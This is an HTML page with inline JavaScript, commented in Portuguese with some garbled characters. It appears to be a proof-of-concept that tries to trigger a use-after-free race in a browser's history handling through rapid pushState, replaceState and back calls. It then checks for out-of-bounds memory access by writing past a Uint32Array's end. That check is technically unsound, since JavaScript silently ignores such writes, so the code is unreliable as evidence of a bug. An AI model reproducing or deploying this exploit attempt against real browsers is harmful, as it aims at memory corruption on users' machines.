<!DOCTYPE html>
<html><body>
<script>
// TESTE R√ÅPIDO: OOB durante UAF

const BASE = 977, STEP = 14461;

async function test() {
  // Trigger UAF
  let size = BASE;
  for(let i=0; i<48; i++){
    history.pushState({i}, "", "#" + "E".repeat(size));
    history.replaceState({i}, "", "#" + "E".repeat(size>>1));
    if(i%6===0) setTimeout(()=>history.back(),0);
    size += STEP;
    await new Promise(r=>setTimeout(r,5));
  }
  
  await new Promise(r=>setTimeout(r,200));
  
  // Durante race
  window.addEventListener('popstate', (e) => {
    if(e.state && e.state.i >= 40) {
      console.log("RACE!");
      
      // TESTE CR√çTICO
      const arr = new Uint32Array(10);
      arr[10] = 0xDEADBEEF;  // OOB write
      const val = arr[10];    // OOB read
      
      console.log("arr[10] =", val ? "0x"+val.toString(16) : "undefined");
      
      if(val === 0xDEADBEEF) {
        alert("üö® OOB WORKS!");
      }
    }
  });
  
  for(let i=0; i<15; i++) {
    history.back();
    await new Promise(r=>setTimeout(r,40));
  }
}

test();
</script>
</body></html>
